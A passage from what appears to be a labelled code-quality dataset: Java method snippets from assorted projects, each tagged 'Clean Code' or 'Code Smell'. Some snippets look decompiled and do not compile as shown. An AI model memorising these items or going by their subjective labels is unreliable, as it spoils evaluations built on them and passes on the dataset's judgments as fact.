  this.status=status;
  this.message=message;
  this.debugMessage=ex.getLocalizedMessage();
}
",0,Clean Code
"/** 
 * Check whether this exception contains an exception of the given type: either it is of the given class itself or it contains a nested cause of the given type.
 * @param exType the exception type to look for
 * @return whether there is a nested exception of the specified type
 */
public boolean contains(Class exType){
  if (exType == null) {
    return false;
  }
  if (exType.isInstance(this)) {
    return true;
  }
  Throwable cause=getCause();
  if (cause == this) {
    return false;
  }
  if (cause instanceof NestedRuntimeException) {
    return ((NestedRuntimeException)cause).contains(exType);
  }
 else {
    while (cause != null) {
      if (exType.isInstance(cause)) {
        return true;
      }
      if (cause.getCause() == cause) {
        break;
      }
      cause=cause.getCause();
    }
    return false;
  }
}
",1,Code Smell
"/** 
 * @author IzzelAliz
 * @reason
 */
@Overwrite public static <T extends PacketListener>void ensureRunningOnSameThread(Packet<T> packetIn,T processor,BlockableEventLoop<?> executor) throws RunningOnDifferentThreadException {
  if (!executor.isSameThread()) {
    executor.executeIfPossible(() -> {
      if (processor instanceof ServerCommonPacketListenerBridge && ((ServerCommonPacketListenerBridge)processor).bridge$processedDisconnect()) {
        return;
      }
      if (processor.isAcceptingMessages()) {
        try {
          packetIn.handle(processor);
        }
 catch (        Exception exception) {
          if (exception instanceof ReportedException) {
            if (reportedexception.getCause() instanceof OutOfMemoryError) {
              throw exception;
            }
          }
          if (processor.shouldPropagateHandlingExceptions()) {
            if (exception instanceof ReportedException) {
              processor.fillCrashReport(r.getReport());
              throw exception;
            }
 else {
              CrashReport crashreport=CrashReport.forThrowable(exception,""Main thread packet handler"");
              processor.fillCrashReport(crashreport);
              throw new ReportedException(crashreport);
            }
          }
          LOGGER.error(""Failed to handle packet {}, suppressing error"",packetIn,exception);
        }
      }
 else {
        LOGGER.debug(""Ignoring packet due to disconnection: "" + packetIn);
      }
    }
);
    throw RunningOnDifferentThreadException.RUNNING_ON_DIFFERENT_THREAD;
  }
}
",1,Code Smell
"@Override public void run(ApplicationArguments args) throws Exception {
  String routePrefix="""";
  if (SaFoxUtil.isNotEmpty(contextPath)) {
    if (!contextPath.startsWith(""/"")) {
      contextPath=""/"" + contextPath;
    }
    if (contextPath.endsWith(""/"")) {
      contextPath=contextPath.substring(0,contextPath.length() - 1);
    }
    routePrefix+=contextPath;
  }
  if (SaFoxUtil.isNotEmpty(servletPath)) {
    if (!servletPath.startsWith(""/"")) {
      servletPath=""/"" + servletPath;
    }
    if (servletPath.endsWith(""/"")) {
      servletPath=servletPath.substring(0,servletPath.length() - 1);
    }
    routePrefix+=servletPath;
  }
  if (SaFoxUtil.isNotEmpty(routePrefix) && !routePrefix.equals(""/"")) {
    ApplicationInfo.routePrefix=routePrefix;
  }
}",0,Clean Code
"private ClusterExemplarProto(com.google.protobuf.GeneratedMessageV3.Builder<?> builder){
  super(builder);
}
private ClusterExemplarProto(){
}
!org.eclipse.jdt.core.dom.MethodDeclaration@5684ccb6",0,Clean Code
"public static List<ApplicationInfo> getInstalledApplications(PackageManager packageManager){
  if (packageManager == null) {
    return Collections.emptyList();
  }
  @SuppressLint(""WrongConstant"") List<ApplicationInfo> installedApplications=packageManager.getInstalledApplications(PackageManager.GET_UNINSTALLED_PACKAGES | PackageManager.GET_DISABLED_COMPONENTS);
  int userApp=0;
  for (  ApplicationInfo installedApplication : installedApplications) {
    if ((installedApplication.flags & ApplicationInfo.FLAG_SYSTEM) == 0) {
      if (userApp++ > 3) {
        return installedApplications;
      }
    }
  }
  List<ApplicationInfo> applicationInfos=new ArrayList<>();
  for (int uid=0; uid <= Process.LAST_APPLICATION_UID; uid++) {
    String[] packagesForUid=packageManager.getPackagesForUid(uid);
    if (packagesForUid == null || packagesForUid.length == 0) {
      continue;
    }
    for (    String pkg : packagesForUid) {
      try {
        ApplicationInfo applicationInfo=packageManager.getApplicationInfo(pkg,0);
        applicationInfos.add(applicationInfo);
      }
 catch (      PackageManager.NameNotFoundException ignored) {
      }
    }
  }
  return applicationInfos;
}",1,Code Smell
"@Override public void nodeClicked(final CombinedDiffNode node,final MouseEvent event,final double x,final double y){
  if (SwingUtilities.isRightMouseButton(event)) {
    if (node.getRawNode() instanceof RawCombinedFunction) {
      final JPopupMenu menu=new CallGraphPopupMenu(controller,graph,node);
      menu.show(graph.getView(),event.getX(),event.getY());
    }
 else     if (node.getRawNode() instanceof RawCombinedBasicBlock) {
      final JPopupMenu menu=new FlowGraphPopupMenu(controller,graph,node);
      menu.show(graph.getView(),event.getX(),event.getY());
    }
    return;
  }
  if (SwingUtilities.isLeftMouseButton(event) && event.getClickCount() == 2 && graph.getGraphType() == EGraphType.CALL_GRAPH) {
    controller.openFlowgraphsViews(node);
  }
}",0,Clean Code
"/** 
 * Show or hide title view in  {@link BrowseFragment} for fragments mapped to{@link PageRow}.  Otherwise the request is ignored, in that case BrowseFragment is fully in control of showing/hiding title view. <p> When HeadersFragment is visible, BrowseFragment will hide search affordance view if there are other focusable rows above currently focused row.
 * @param show Boolean indicating whether or not to show the title view.
 */
void showTitleView(boolean show);
@Override public void showTitleView(boolean show){
  mShowTitleView=show;
  if (mMainFragmentAdapter == null || mMainFragmentAdapter.getFragmentHost() != this) {
    return;
  }
  if (!mIsPageRow) {
    return;
  }
  updateTitleViewVisibility();
}
",0,Clean Code
"/** 
 * Query group's offset records stored in broker.
 * @param msgStore       history offset store
 * @param groupName      group name
 * @param requestOffset  request offset
 * @param recordStamp    record timestamp
 * @param msgCount       at most record count
 * @param maxRetryCnt    max query turns
 * @param strBuff        string buffer
 */
private void queryGroupStoredOffsets(MessageStore msgStore,String groupName,long requestOffset,long recordStamp,int msgCount,int maxRetryCnt,StringBuilder strBuff){
  int msgTypeCode;
  int partitionId;
  int msgAccCnt=0;
  boolean msgMatched;
  Throwable qryThrow;
  GetMessageResult getMessageResult;
  msgTypeCode=groupName.hashCode();
  partitionId=Math.abs(msgTypeCode) % TServerConstants.OFFSET_HISTORY_NUMPARTS;
  Set<String> filterCodes=new HashSet<>();
  filterCodes.add(groupName);
  ConsumerNodeInfo consumerNodeInfo=new ConsumerNodeInfo(broker.getStoreManager(),groupName,""offsetConsumer"",filterCodes,"""",System.currentTimeMillis(),"""","""");
  int qryRetryCount=0;
  long itemInitOffset=requestOffset;
  int maxTransferSize=broker.getStoreManager().getMaxMsgTransferSize();
  do {
    qryThrow=null;
    try {
      getMessageResult=msgStore.getMessages(303,itemInitOffset,partitionId,consumerNodeInfo,TServerConstants.OFFSET_HISTORY_NAME,maxTransferSize,recordStamp);
    }
 catch (    Throwable e2) {
      qryThrow=e2;
      continue;
    }
    if (getMessageResult.transferedMessageList == null || getMessageResult.transferedMessageList.isEmpty()) {
      itemInitOffset+=getMessageResult.lastReadOffset;
      continue;
    }
    msgMatched=false;
    List<Message> messageList=DataConverterUtil.convertMessage(TServerConstants.OFFSET_HISTORY_NAME,getMessageResult.transferedMessageList);
    for (    Message message : messageList) {
      if (message == null) {
        continue;
      }
      if (!groupName.equals(message.getAttrValue(TServerConstants.TOKEN_OFFSET_GROUP))) {
        continue;
      }
      msgMatched=true;
      if (msgAccCnt++ == 0) {
        strBuff.append(""{\""groupName\"":\"""").append(groupName).append(""\"",\""result\"":true,\""errMsg\"":\""ok\"",\""records\"":["").append(StringUtils.newStringUtf8(message.getData()));
      }
 else {
        strBuff.append("","").append(StringUtils.newStringUtf8(message.getData()));
      }
      if (msgAccCnt >= msgCount) {
        break;
      }
    }
    if (msgMatched) {
      break;
    }
    itemInitOffset+=getMessageResult.lastReadOffset;
  }
 while (++qryRetryCount < maxRetryCnt);
  if (msgAccCnt > 0) {
    strBuff.append(""],\""recordCount\"":"").append(msgAccCnt).append(""}"");
  }
 else {
    if (qryThrow == null) {
      strBuff.append(""{\""groupName\"":\"""").append(groupName).append(""\"",\""result\"":false,\""errMsg\"":\""Could not find record!\""}"");
    }
 else {
      strBuff.append(""{\""groupName\"":\"""").append(groupName).append(""\"",\""result\"":false,\""errMsg\"":\""Get Message failure: "").append(qryThrow.getMessage()).append(""\""}"");
    }
  }
}",1,Code Smell
"@EventHandler private void onTick(TickEvent.Post event){
  if (autoCastCheckTimer <= 0) {
    autoCastCheckTimer=30;
    if (autoCast.get() && !ticksEnabled && !autoCastEnabled&& mc.player.fishHook == null && hasFishingRod()) {
      autoCastTimer=0;
      autoCastEnabled=true;
    }
  }
 else {
    autoCastCheckTimer--;
  }
  if (autoCastEnabled) {
    autoCastTimer++;
    if (autoCastTimer > ticksAutoCast.get()) {
      autoCastEnabled=false;
      Utils.rightClick();
    }
  }
  if (ticksEnabled && ticksToRightClick <= 0) {
    if (ticksData == 0) {
      Utils.rightClick();
      ticksToRightClick=ticksThrow.get();
      ticksData=1;
    }
 else     if (ticksData == 1) {
      Utils.rightClick();
      ticksEnabled=false;
    }
  }
  ticksToRightClick--;
}",1,Code Smell
"@SuppressWarnings(""unchecked"") private List<PerformanceTestResult> getPerformanceResult(TestRun testRun){
  List<PerformanceTestResult> performanceTestResult=null;
  String fileId="""";
  StorageFileInfo perfBlobFile=null;
  for (  StorageFileInfo f : testRun.getAttachments()) {
    if (f.getFileName().contains(Const.PerformanceConfig.DEFAULT_FILE_NAME)) {
      fileId=f.getFileId();
      perfBlobFile=f;
      break;
    }
  }
  if (fileId.isEmpty()) {
    return null;
  }
  if (perfBlobFile == null) {
    throw new HydraLabRuntimeException(""Graph zip file not exist!"");
  }
  File perfFile=new File(CENTER_TEMP_FILE_DIR,perfBlobFile.getBlobPath());
  if (!perfFile.exists()) {
    storageServiceClientProxy.download(perfFile,perfBlobFile);
  }
  if (!perfFile.exists()) {
    return null;
  }
  try (FileReader reader=new FileReader(perfFile)){
    BufferedReader br=new BufferedReader(reader);
    String line;
    StringBuilder sb=new StringBuilder();
    while ((line=br.readLine()) != null) {
      sb.append(line);
    }
    br.close();
    String jsonString=sb.toString();
    List<PerformanceTestResult> results=JSON.parseArray(jsonString,PerformanceTestResult.class);
    JSONArray ja=JSON.parseArray(jsonString);
    for (int i=0; i < ja.size(); i++) {
      PerformanceTestResult result=results.get(i);
      Class classType=this.performanceTypeMap.get(result.parserType);
      JSONObject jo=(JSONObject)ja.get(i);
      List<Object> inspects=new ArrayList<Object>();
      Object performanceInspectionResults=jo.get(""performanceInspectionResults"");
      if (performanceInspectionResults instanceof List<?>) {
        inspects=(List<Object>)performanceInspectionResults;
      }
      for (int j=0; j < inspects.size(); j++) {
        JSONObject inspect=(JSONObject)inspects.get(j);
        if (inspect == null) {
          continue;
        }
        JSONObject parsedData=(JSONObject)inspect.get(""parsedData"");
        if (parsedData == null) {
          continue;
        }
        result.performanceInspectionResults.get(j).parsedData=parsedData.toJavaObject(classType);
      }
    }
    performanceTestResult=results;
  }
 catch (  FileNotFoundException e) {
    e.printStackTrace();
  }
catch (  IOException e) {
    e.printStackTrace();
  }
catch (  Exception e) {
    e.printStackTrace();
  }
  return performanceTestResult;
}",1,Code Smell
"protected void buildExpression(String expression) throws ParseException {
  expressionParsed=true;
  try {
    if (seconds == null) {
      seconds=new TreeSet<Integer>();
    }
    if (minutes == null) {
      minutes=new TreeSet<Integer>();
    }
    if (hours == null) {
      hours=new TreeSet<Integer>();
    }
    if (daysOfMonth == null) {
      daysOfMonth=new TreeSet<Integer>();
    }
    if (months == null) {
      months=new TreeSet<Integer>();
    }
    if (daysOfWeek == null) {
      daysOfWeek=new TreeSet<Integer>();
    }
    if (years == null) {
      years=new TreeSet<Integer>();
    }
    int exprOn=SECOND;
    StringTokenizer exprsTok=new StringTokenizer(expression,"" \t"",false);
    while (exprsTok.hasMoreTokens() && exprOn <= YEAR) {
      String expr=exprsTok.nextToken().trim();
      if (exprOn == DAY_OF_MONTH && expr.indexOf('L') != -1 && expr.length() > 1 && expr.contains("","")) {
        throw new ParseException(""Support for specifying 'L' and 'LW' with other days of the month is not implemented"",-1);
      }
      if (exprOn == DAY_OF_WEEK && expr.indexOf('L') != -1 && expr.length() > 1 && expr.contains("","")) {
        throw new ParseException(""Support for specifying 'L' with other days of the week is not implemented"",-1);
      }
      if (exprOn == DAY_OF_WEEK && expr.indexOf('#') != -1 && expr.indexOf('#',expr.indexOf('#') + 1) != -1) {
        throw new ParseException(""Support for specifying multiple \""nth\"" days is not implemented."",-1);
      }
      StringTokenizer vTok=new StringTokenizer(expr,"","");
      while (vTok.hasMoreTokens()) {
        String v=vTok.nextToken();
        storeExpressionVals(0,v,exprOn);
      }
      exprOn++;
    }
    if (exprOn <= DAY_OF_WEEK) {
      throw new ParseException(""Unexpected end of expression."",expression.length());
    }
    if (exprOn <= YEAR) {
      storeExpressionVals(0,""*"",YEAR);
    }
    TreeSet<Integer> dow=getSet(DAY_OF_WEEK);
    TreeSet<Integer> dom=getSet(DAY_OF_MONTH);
    boolean dayOfMSpec=!dom.contains(NO_SPEC);
    boolean dayOfWSpec=!dow.contains(NO_SPEC);
    if (!dayOfMSpec || dayOfWSpec) {
      if (!dayOfWSpec || dayOfMSpec) {
        throw new ParseException(""Support for specifying both a day-of-week AND a day-of-month parameter is not implemented."",0);
      }
    }
  }
 catch (  ParseException pe) {
    throw pe;
  }
catch (  Exception e) {
    throw new ParseException(""Illegal cron expression format ("" + e.toString() + "")"",0);
  }
}",0,Clean Code
"@Override protected void onLayout(boolean changed,int l,int t,int r,int b){
  super.onLayout(changed,l,t,r,b);
  int heroIndex=getHeroIndex();
  View heroView=getChildAt(heroIndex);
  int heroLeft=getWidth() / 2 - heroView.getMeasuredWidth() / 2;
  int heroRight=getWidth() / 2 + heroView.getMeasuredWidth() / 2;
  heroView.layout(heroLeft,getPaddingTop(),heroRight,getPaddingTop() + heroView.getMeasuredHeight());
  int heroCenter=getPaddingTop() + heroView.getMeasuredHeight() / 2;
  for (int i=heroIndex - 1; i >= 0; i--) {
    heroLeft-=mMeasuredMarginInPixel;
    View child=getChildAt(i);
    child.layout(heroLeft - child.getMeasuredWidth(),heroCenter - child.getMeasuredHeight() / 2,heroLeft,heroCenter + child.getMeasuredHeight() / 2);
    heroLeft-=child.getMeasuredWidth();
  }
  for (int i=heroIndex + 1; i < mNumOfThumbs; i++) {
    heroRight+=mMeasuredMarginInPixel;
    View child=getChildAt(i);
    child.layout(heroRight,heroCenter - child.getMeasuredHeight() / 2,heroRight + child.getMeasuredWidth(),heroCenter + child.getMeasuredHeight() / 2);
    heroRight+=child.getMeasuredWidth();
  }
}",0,Clean Code
"@Test public void testFuryObjectOutput() throws IOException {
  Fury fury=Fury.builder().build();
  MemoryBuffer buffer=MemoryUtils.buffer(32);
  try (MemoryBufferObjectOutput output=new MemoryBufferObjectOutput(fury,buffer)){
    output.writeByte(1);
    output.writeInt(2);
    output.writeLong(3);
    output.writeBoolean(true);
    output.writeFloat(4.1f);
    output.writeDouble(4.2);
    output.writeChars(""abc"");
    output.writeUTF(""abc"");
  }
   try (MemoryBufferObjectInput input=new MemoryBufferObjectInput(fury,buffer)){
    assertEquals(input.readByte(),1);
    assertEquals(input.readInt(),2);
    assertEquals(input.readLong(),3);
    assertTrue(input.readBoolean());
    assertEquals(input.readFloat(),4.1f);
    assertEquals(input.readDouble(),4.2);
    assertEquals(input.readUTF(),""abc"");
    assertEquals(input.readUTF(),""abc"");
  }
 }",0,Clean Code
"@Override protected void afterHookedMethod(MethodHookParam param) throws Throwable {
  new Thread(() -> {
    try {
      while (mBrightnessMirrorController == null) {
        sleep(500);
        mBrightnessMirrorController=getObjectField(param.thisObject,""mBrightnessMirrorController"");
      }
      dataCollected(2,BrightnessMirrorHandlerClass);
    }
 catch (    Throwable ignored) {
    }
  }
).start();
}
@Override protected void afterHookedMethod(MethodHookParam param) throws Throwable {
  setSliderMargins((View)getObjectField(param.thisObject,""mBrightnessView""));
}
@Override protected void afterHookedMethod(MethodHookParam param) throws Throwable {
  setQSVisibility();
  setQQSVisibility();
}
@Override protected void afterHookedMethod(MethodHookParam param) throws Throwable {
  QSPanelController=param.thisObject;
  brightnessControllerFactory=param.args[11];
  brightnessSliderFactory=param.args[12];
  mTunerService=getObjectField(param.thisObject,""mTunerService"");
  dataCollected(0,BrightnessMirrorHandlerClass);
  setQSVisibility();
}
@Override protected void afterHookedMethod(MethodHookParam param) throws Throwable {
}
@Override protected void afterHookedMethod(MethodHookParam param) throws Throwable {
  QQSPC=param.thisObject;
  dataCollected(1,BrightnessMirrorHandlerClass);
}
@Override protected void afterHookedMethod(MethodHookParam param) throws Throwable {
}",0,Clean Code
"@NonNull @Override public Resource<Bitmap> transform(@NonNull Context context,@NonNull Resource<Bitmap> resource,int outWidth,int outHeight){
  Bitmap source=resource.get();
  int finalWidth, finalHeight;
  float ratio;
  if (outWidth > outHeight) {
    ratio=(float)outHeight / (float)outWidth;
    finalWidth=source.getWidth();
    finalHeight=(int)((float)source.getWidth() * ratio);
    if (finalHeight > source.getHeight()) {
      ratio=(float)outWidth / (float)outHeight;
      finalHeight=source.getHeight();
      finalWidth=(int)((float)source.getHeight() * ratio);
    }
  }
 else   if (outWidth < outHeight) {
    ratio=(float)outWidth / (float)outHeight;
    finalHeight=source.getHeight();
    finalWidth=(int)((float)source.getHeight() * ratio);
    if (finalWidth > source.getWidth()) {
      ratio=(float)outHeight / (float)outWidth;
      finalWidth=source.getWidth();
      finalHeight=(int)((float)source.getWidth() * ratio);
    }
  }
 else {
    finalHeight=source.getHeight();
    finalWidth=finalHeight;
  }
  this.radius*=(float)finalHeight / (float)outHeight;
  Bitmap outBitmap=this.mBitmapPool.get(finalWidth,finalHeight,Bitmap.Config.ARGB_8888);
  if (outBitmap == null) {
    outBitmap=Bitmap.createBitmap(finalWidth,finalHeight,Bitmap.Config.ARGB_8888);
  }
  Canvas canvas=new Canvas(outBitmap);
  Paint paint=new Paint();
  BitmapShader shader=new BitmapShader(source,Shader.TileMode.CLAMP,Shader.TileMode.CLAMP);
  int width=(source.getWidth() - finalWidth) / 2;
  int height=(source.getHeight() - finalHeight) / 2;
  if (width != 0 || height != 0) {
    Matrix matrix=new Matrix();
    matrix.setTranslate((float)(-width),(float)(-height));
    shader.setLocalMatrix(matrix);
  }
  paint.setShader(shader);
  paint.setAntiAlias(true);
  RectF rectF=new RectF(0.0F,0.0F,(float)canvas.getWidth(),(float)canvas.getHeight());
  canvas.drawRoundRect(rectF,this.radius,this.radius,paint);
  if (exceptLeftTop) {
    canvas.drawRect(0,0,radius,radius,paint);
  }
  if (exceptRightTop) {
    canvas.drawRect(canvas.getWidth() - radius,0,radius,radius,paint);
  }
  if (exceptLeftBottom) {
    canvas.drawRect(0,canvas.getHeight() - radius,radius,canvas.getHeight(),paint);
  }
  if (exceptRightBotoom) {
    canvas.drawRect(canvas.getWidth() - radius,canvas.getHeight() - radius,canvas.getWidth(),canvas.getHeight(),paint);
  }
  return BitmapResource.obtain(outBitmap,this.mBitmapPool);
}",1,Code Smell
"@Override @Transactional(rollbackFor=Exception.class) public void deleteStockCheck(List<Long> ids){
  List<ErpStockCheckDO> stockChecks=stockCheckMapper.selectBatchIds(ids);
  if (CollUtil.isEmpty(stockChecks)) {
    return;
  }
  stockChecks.forEach(stockCheck -> {
    if (ErpAuditStatus.APPROVE.getStatus().equals(stockCheck.getStatus())) {
      throw exception(STOCK_CHECK_DELETE_FAIL_APPROVE,stockCheck.getNo());
    }
  }
);
  stockChecks.forEach(stockCheck -> {
    stockCheckMapper.deleteById(stockCheck.getId());
    stockCheckItemMapper.deleteByCheckId(stockCheck.getId());
  }
);
}
",0,Clean Code
"public static boolean getCastedExprent(Exprent exprent,VarType leftType,TextBuffer buffer,int indent,boolean castNull,BytecodeMappingTracer tracer){
  return getCastedExprent(exprent,leftType,buffer,indent,castNull,false,false,false,tracer);
}
public static boolean getCastedExprent(Exprent exprent,VarType leftType,TextBuffer buffer,int indent,boolean castNull,boolean castAlways,boolean castNarrowing,boolean unbox,BytecodeMappingTracer tracer){
  if (unbox) {
    if (exprent.type == Exprent.EXPRENT_INVOCATION && ((InvocationExprent)exprent).isBoxingCall()) {
      InvocationExprent invocationExprent=(InvocationExprent)exprent;
      exprent=invocationExprent.getLstParameters().get(0);
      int paramType=invocationExprent.getDescriptor().params[0].type;
      if (exprent.type == Exprent.EXPRENT_CONST && ((ConstExprent)exprent).getConstType().type != paramType) {
        leftType=new VarType(paramType);
      }
    }
  }
  VarType rightType=exprent.getExprType();
  boolean cast=castAlways || (!leftType.isSuperset(rightType) && (rightType.equals(VarType.VARTYPE_OBJECT) || leftType.type != TYPE_OBJECT)) || (castNull && rightType.type == TYPE_NULL && !UNDEFINED_TYPE_STRING.equals(getTypeName(leftType)))|| (castNarrowing && isIntConstant(exprent) && isNarrowedIntType(leftType));
  boolean quote=cast && exprent.getPrecedence() >= FunctionExprent.getPrecedence(FunctionExprent.FUNCTION_CAST);
  if (castNarrowing && exprent.type == Exprent.EXPRENT_CONST && !((ConstExprent)exprent).isNull()) {
    if (leftType.equals(VarType.VARTYPE_BYTE_OBJ)) {
      leftType=VarType.VARTYPE_BYTE;
    }
 else     if (leftType.equals(VarType.VARTYPE_SHORT_OBJ)) {
      leftType=VarType.VARTYPE_SHORT;
    }
  }
  if (cast)   buffer.append('(').append(getCastTypeName(leftType)).append(')');
  if (quote)   buffer.append('(');
  if (exprent.type == Exprent.EXPRENT_CONST) {
    ((ConstExprent)exprent).adjustConstType(leftType);
  }
  buffer.append(exprent.toJava(indent,tracer));
  if (quote)   buffer.append(')');
  return cast;
}",1,Code Smell
"@Override protected final void onCreate(@Nullable Bundle savedInstanceState){
  super.onCreate(savedInstanceState);
  if (savedInstanceState != null) {
    mStageId=savedInstanceState.getInt(KEY_STAGE_ID,IntIdGenerator.INVALID_ID);
    ArrayList<String> list=savedInstanceState.getStringArrayList(KEY_SCENE_TAG_LIST);
    if (list != null) {
      mSceneTagList.addAll(list);
      mDelaySceneTagList.addAll(list);
    }
    mIdGenerator.lazySet(savedInstanceState.getInt(KEY_NEXT_ID));
  }
  if (mStageId == IntIdGenerator.INVALID_ID) {
    ((SceneApplication)getApplicationContext()).registerStageActivity(this);
  }
 else {
    ((SceneApplication)getApplicationContext()).registerStageActivity(this,mStageId);
  }
  onCreate2(savedInstanceState);
  Intent intent=getIntent();
  if (savedInstanceState == null) {
    if (intent != null) {
      String action=intent.getAction();
      if (Intent.ACTION_MAIN.equals(action)) {
        Announcer announcer=getLaunchAnnouncer();
        if (announcer != null) {
          startScene(announcer);
          return;
        }
      }
 else       if (ACTION_START_SCENE.equals(action)) {
        if (startSceneFromIntent(intent)) {
          return;
        }
      }
    }
    onUnrecognizedIntent(intent);
  }
}",1,Code Smell
"/** 
 * Pre-parses and initializes a new  {@code JSONPointer} instance. If you want toevaluate the same JSON Pointer on different JSON documents then it is recommended to keep the  {@code JSONPointer} instances due to performance considerations.
 * @param pointer the JSON String or URI Fragment representation of the JSON pointer.
 * @throws IllegalArgumentException if {@code pointer} is not a valid JSON pointer
 */
public JSONPointer(final String pointer){
  if (pointer == null) {
    throw new NullPointerException(""pointer cannot be null"");
  }
  if (pointer.isEmpty() || pointer.equals(""#"")) {
    this.refTokens=Collections.emptyList();
    return;
  }
  String refs;
  if (pointer.startsWith(""#/"")) {
    refs=pointer.substring(2);
    try {
      refs=URLDecoder.decode(refs,ENCODING);
    }
 catch (    UnsupportedEncodingException e) {
      throw new RuntimeException(e);
    }
  }
 else   if (pointer.startsWith(""/"")) {
    refs=pointer.substring(1);
  }
 else {
    throw new IllegalArgumentException(""a JSON pointer should start with '/' or '#/'"");
  }
  this.refTokens=new ArrayList<String>();
  int slashIdx=-1;
  int prevSlashIdx=0;
  do {
    prevSlashIdx=slashIdx + 1;
    slashIdx=refs.indexOf('/',prevSlashIdx);
    if (prevSlashIdx == slashIdx || prevSlashIdx == refs.length()) {
      this.refTokens.add("""");
    }
 else     if (slashIdx >= 0) {
      final String token=refs.substring(prevSlashIdx,slashIdx);
      this.refTokens.add(unescape(token));
    }
 else {
      final String token=refs.substring(prevSlashIdx);
      this.refTokens.add(unescape(token));
    }
  }
 while (slashIdx >= 0);
}
public JSONPointer(List<String> refTokens){
  this.refTokens=new ArrayList<String>(refTokens);
}",0,Clean Code
"@Override public void hook() throws Throwable {
  if (Helper.prefs.getBoolean(""switch_mainswitch"",false) && Helper.prefs.getBoolean(""switch_reddot"",false)) {
    XposedBridge.hookAllMethods(FeedsTabsFragment,""onUnReadCountLoaded"",XC_MethodReplacement.returnConstant(null));
    if (BaseFeedFollowAvatarViewHolder_setUnreadTipVisibility != null)     XposedBridge.hookMethod(BaseFeedFollowAvatarViewHolder_setUnreadTipVisibility,XC_MethodReplacement.returnConstant(null));
    if (ZHMainTabLayout_updateBadges != null)     XposedBridge.hookMethod(ZHMainTabLayout_updateBadges,XC_MethodReplacement.returnConstant(null));
    if (BottomNavMenuItemView_setUnreadCount != null)     XposedBridge.hookMethod(BottomNavMenuItemView_setUnreadCount,XC_MethodReplacement.returnConstant(null));
    if (BottomNavMenuItemViewForIconOnly_setUnreadCount != null)     XposedBridge.hookMethod(BottomNavMenuItemViewForIconOnly_setUnreadCount,XC_MethodReplacement.returnConstant(null));
    if (BaseBottomNavMenuItemView_setNavBadge != null)     XposedBridge.hookMethod(BaseBottomNavMenuItemView_setNavBadge,XC_MethodReplacement.returnConstant(null));
    XposedHelpers.findAndHookMethod(NotiMsgModel,""getUnreadCount"",XC_MethodReplacement.returnConstant(0));
    if (NotiUnreadCountKt_hasUnread != null)     XposedBridge.hookMethod(NotiUnreadCountKt_hasUnread,XC_MethodReplacement.returnConstant(false));
    if (IconWithDotAndCountView_setUnreadCount != null)     XposedBridge.hookMethod(IconWithDotAndCountView_setUnreadCount,XC_MethodReplacement.returnConstant(null));
    if (CountDotView_setUnreadCount != null)     XposedBridge.hookMethod(CountDotView_setUnreadCount,new XC_MethodReplacement(){
      @Override protected Object replaceHookedMethod(      MethodHookParam param){
        View obj=(View)param.thisObject;
        obj.setVisibility(View.GONE);
        return null;
      }
    }
);
    if (ViewModel != null) {
      XposedHelpers.findAndHookConstructor(ViewModel,View.class,new XC_MethodHook(){
        @Override protected void afterHookedMethod(        MethodHookParam param){
          try {
            ViewGroup view=(ViewGroup)param.args[0];
            if (view.getChildCount() == 2) {
              view.setVisibility(View.GONE);
            }
          }
 catch (          Throwable ignored) {
          }
        }
      }
);
    }
    if (RevisitView_getCanShowRedDot != null)     XposedBridge.hookMethod(RevisitView_getCanShowRedDot,XC_MethodReplacement.returnConstant(false));
  }
}",1,Code Smell
"@SuppressWarnings(""unchecked"") private static boolean isSynthesizable(Class<? extends Annotation> annotationType){
  if (hasPlainJavaAnnotationsOnly(annotationType)) {
    return false;
  }
  Boolean synthesizable=synthesizableCache.get(annotationType);
  if (synthesizable != null) {
    return synthesizable;
  }
  synthesizable=Boolean.FALSE;
  for (  Method attribute : getAttributeMethods(annotationType)) {
    if (!getAttributeAliasNames(attribute).isEmpty()) {
      synthesizable=Boolean.TRUE;
      break;
    }
    Class<?> returnType=attribute.getReturnType();
    if (Annotation[].class.isAssignableFrom(returnType)) {
      Class<? extends Annotation> nestedAnnotationType=(Class<? extends Annotation>)returnType.getComponentType();
      if (isSynthesizable(nestedAnnotationType)) {
        synthesizable=Boolean.TRUE;
        break;
      }
    }
 else     if (Annotation.class.isAssignableFrom(returnType)) {
      Class<? extends Annotation> nestedAnnotationType=(Class<? extends Annotation>)returnType;
      if (isSynthesizable(nestedAnnotationType)) {
        synthesizable=Boolean.TRUE;
        break;
      }
    }
  }
  synthesizableCache.put(annotationType,synthesizable);
  return synthesizable;
}
",0,Clean Code
"/** 
 * Make the collection of class names denser.
 * @param src source class names
 * @return map of [src class name, denser class name]
 */
public static Map<String,String> denseClassNames(Collection<String> src){
  if (src.isEmpty())   return Collections.emptyMap();
  int maxLen=Integer.MIN_VALUE;
  for (  String s : src) {
    maxLen=Math.max(maxLen,s.length());
  }
  boolean first=true;
  boolean prefixCut=false;
  String[] prefix=new String[0];
  for (  String s : src) {
    String[] names=s.split(""\\."");
    if (first) {
      prefix=new String[names.length];
      int c;
      for (c=0; c < names.length; c++) {
        if (names[c].toLowerCase().equals(names[c])) {
          prefix[c]=names[c];
        }
 else {
          break;
        }
      }
      prefix=Arrays.copyOf(prefix,c);
      first=false;
      continue;
    }
    int c=0;
    while (c < Math.min(prefix.length,names.length)) {
      String n=names[c];
      String p=prefix[c];
      if (!n.equals(p) || !n.toLowerCase().equals(n)) {
        break;
      }
      c++;
    }
    if (prefix.length != c) {
      prefixCut=true;
    }
    prefix=Arrays.copyOf(prefix,c);
  }
  for (int c=0; c < prefix.length; c++) {
    prefix[c]=prefixCut ? String.valueOf(prefix[c].charAt(0)) : """";
  }
  Map<String,String> result=new HashMap<>();
  for (  String s : src) {
    int prefixLen=prefix.length;
    String[] names=s.split(""\\."");
    System.arraycopy(prefix,0,names,0,prefixLen);
    String dense="""";
    for (    String n : names) {
      if (!n.isEmpty()) {
        dense+=n + ""."";
      }
    }
    if (dense.endsWith(""."")) {
      dense=dense.substring(0,dense.length() - 1);
    }
    result.put(s,dense);
  }
  return result;
}",1,Code Smell
"boolean isUnmatched(Invoke invoke,JMethod target){
  TypeInfo typeInfo=getTypeInfo(invoke);
  if (typeInfo != UNKNOWN) {
    Type returnType=typeInfo.returnType();
    if (returnType != null) {
      if (target.isConstructor()) {
        Type objType=target.getDeclaringClass().getType();
        if (!typeSystem.isSubtype(returnType,objType)) {
          return true;
        }
      }
 else {
        Type targetReturnType=target.getReturnType();
        if (isUnmatched(returnType,targetReturnType)) {
          return true;
        }
      }
    }
    List<Type> argumentTypes=typeInfo.argumentTypes();
    if (argumentTypes != null) {
      if (argumentTypes.size() != target.getParamCount()) {
        return true;
      }
      for (int i=0; i < argumentTypes.size(); ++i) {
        Type argType=argumentTypes.get(i);
        Type paramType=target.getParamType(i);
